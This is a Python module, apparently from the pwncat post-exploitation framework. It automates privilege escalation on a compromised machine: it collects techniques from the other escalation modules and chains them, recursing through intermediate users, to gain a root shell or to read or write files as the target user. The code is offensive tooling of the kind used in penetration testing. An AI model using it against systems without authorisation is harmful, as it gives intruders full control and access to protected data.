#!/usr/bin/env python3

from pwncat.modules import (
    BaseModule,
    Bool,
    Result,
    Status,
    Argument,
    ArgumentFormatError,
    MissingArgument,
)
from pwncat.modules.escalate import (
    EscalateChain,
    EscalateResult,
    EscalateModule,
    FileContentsResult,
    EscalateError,
)
import pwncat.modules


class Module(BaseModule):
    """
    Attempt to automatically escalate to the given user through
    any path available. This may cause escalation through multiple
    users.
    """

    ARGUMENTS = {
        "user": Argument(str, default="root", help="The target user for escalation"),
        "exec": Argument(
            Bool, default=False, help="Attempt to execute a shell as the given user"
        ),
        "read": Argument(
            Bool, default=False, help="Attempt to read a file as the given user"
        ),
        "write": Argument(
            Bool, default=False, help="Attempt to write a file as the given user"
        ),
        "shell": Argument(
            str, default="current", help="The shell to use for escalation"
        ),
        "path": Argument(
            str, default=None, help="The path to the file to be read/written"
        ),
        "data": Argument(str, default=None, help="The data to be written"),
    }
    COLLAPSE_RESULT = True
    PLATFORM = pwncat.platform.Platform.ANY

    def run(self, user, exec, write, read, path, data, shell):

        whole_chain = EscalateChain(None, chain=[])
        tried_users = [user]
        result_list = []
        target_user = user

        if (exec + write + read) > 1:
            raise pwncat.modules.ArgumentFormatError(
                "only one of exec/write/read may be used"
            )

        if (read or write) and path is None:
            raise ArgumentFormatError("file path not specified")

        if write and data is None:
            raise ArgumentFormatError("file content not specified")

        if shell == "current":
            shell = pwncat.victim.shell

        # Collect escalation options
        result = EscalateResult(techniques={})
        yield Status("gathering techniques")
        for module in pwncat.modules.match(r"escalate.*", base=EscalateModule):
            try:
                yield Status(f"gathering techniques from {module.name}")
                result.extend(module.run(progress=self.progress))
            except (ArgumentFormatError, MissingArgument):
                continue

        while True:

            try:
                if exec:
                    yield Status(f"attempting escalation to {target_user}")
                    chain = result.exec(target_user, shell, self.progress)
                    whole_chain.extend(chain)
                    yield whole_chain
                    return
                elif write:
                    yield Status(f"attempting file write as {target_user}")
                    result.write(target_user, path, data, self.progress)
                    whole_chain.unwrap()
                    return
                elif read:
                    yield Status(f"attempting file read as {target_user}")
                    filp = result.read(target_user, path, self.progress)
                    original_close = filp.close

                    # We need to call unwrap after reading the data
                    def close_wrapper():
                        original_close()
                        whole_chain.unwrap()

                    filp.close = close_wrapper

                    yield FileContentsResult(path, filp)
                    return
                else:
                    # We just wanted to list all techniques from all modules
                    yield result
                    return
            except EscalateError:
                pass

            for user in result.techniques.keys():
                # Ignore already tried users
                if user in tried_users:
                    continue

                # Mark this user as tried
                tried_users.append(user)

                try:
                    yield Status(f"attempting recursion to {user}")

                    # Attempt escalation
                    chain = result.exec(user, shell, self.progress)

                    # Extend the chain with this new chain
                    whole_chain.extend(chain)

                    # Save our current results in the list
                    result_list.append(result)

                    # Get new results for this user
                    result = EscalateResult(techniques={})
                    yield Status(f"success! gathering new techniques...")
                    for module in pwncat.modules.match(
                        r"escalate\..*", base=EscalateModule
                    ):
                        try:
                            result.extend(module.run(progress=self.progress))
                        except (
                            ArgumentFormatError,
                            MissingArgument,
                        ):
                            continue

                    # Try again
                    break
                except EscalateError:
                    continue
            else:

                if not result_list:
                    # There are no more results to try...
                    raise EscalateError("no escalation path found")

                # The loop was exhausted. This user didn't work.
                # Go back to the previous step, but don't try this user
                whole_chain.pop()
                result = result_list.pop()
